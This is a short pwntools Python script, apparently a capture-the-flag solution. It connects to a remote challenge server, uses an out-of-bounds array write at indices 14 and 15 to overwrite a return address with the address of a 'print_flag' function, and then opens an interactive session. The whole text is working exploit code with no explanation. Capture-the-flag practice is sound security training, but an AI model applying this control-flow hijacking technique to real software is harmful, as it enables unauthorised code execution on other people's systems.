from pwn import *

context.binary = elf = ELF('./vuln')

def solve():
    # p = process('./vuln')
    p = remote('34.131.141.163', 17319)
    
    p.recvuntil(b'How many times you want to change the array')
    p.sendline(b'2')
    
    print_flag = 0x4011c9
    
    p.recvuntil(b'Index:')
    p.sendline(b'14')
    p.recvuntil(b'Value:')
    p.sendline(str(print_flag).encode())
    
    p.recvuntil(b'Index:')
    p.sendline(b'15')
    p.recvuntil(b'Value:')
    p.sendline(b'0')
    
    p.interactive()

if __name__ == '__main__':
    solve()
